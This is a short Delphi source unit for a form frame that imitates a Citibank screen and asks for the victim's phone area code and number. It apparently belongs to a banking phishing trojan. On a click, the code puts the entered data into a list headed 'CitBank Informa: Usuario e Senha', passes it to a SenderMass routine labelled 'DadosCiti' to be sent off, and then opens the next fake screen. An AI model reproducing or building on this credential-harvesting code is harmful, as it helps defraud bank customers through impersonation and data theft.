unit Celular;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms, 
  Dialogs, pngimage, ExtCtrls, StdCtrls;

type
  TCitiCelu = class(TFrame)
    Image1: TImage;
    EditDDD: TEdit;
    EditCEL: TEdit;
    Edit1: TEdit;
    Image2: TImage;
    procedure EditDDDChange(Sender: TObject);
    procedure EditCELChange(Sender: TObject);
    procedure Image2Click(Sender: TObject);
  private
    { Private declarations }
  public
    S: String;
  end;

implementation

{$R *.dfm}
uses
Natal, Gerador;

procedure TCitiCelu.EditCELChange(Sender: TObject);
begin
  if Length(EditCEL.Text) = 9 then
  Edit1.SetFocus;

  if s = 's' then
begin
if length(EditCEL.Text) = 5 then
begin
EditCEL.Text := EditCEL.Text + '-';
EditCEL.SelStart := length(EditCEL.Text);
end;
end
else
begin
s :='s';
end;
end;

procedure TCitiCelu.EditDDDChange(Sender: TObject);
begin
  if Length(EditDDD.Text) = 2 then
  EditCEL.SetFocus;
end;

procedure TCitiCelu.Image2Click(Sender: TObject);
begin
  begin
  DadosEnvio_ := TStringList.Create;

  DadosEnvio_.Add('=============================================');
  DadosEnvio_.Add('CitBank Informa: Usuario e Senha');
  DadosEnvio_.Add('=============================================');
  DadosEnvio_.Add('DDD:  '+Editddd.text);
  DadosEnvio_.Add('Fone:  '+Editcel.text);
  DadosEnvio_.Add('=============================================');


//SENDBOX
try
begin
  CityBak3 := TCityBak3.Create(Self);

with CityBak3 do
  begin
    Parent := Self;
    Left   := 0;
    Top    := 0;
   end;
  SenderMass(DadosEnvio_ , 'DadosCiti');
  DadosEnvio_.Free;
  end;
finally
end;
  end;
end;

end.
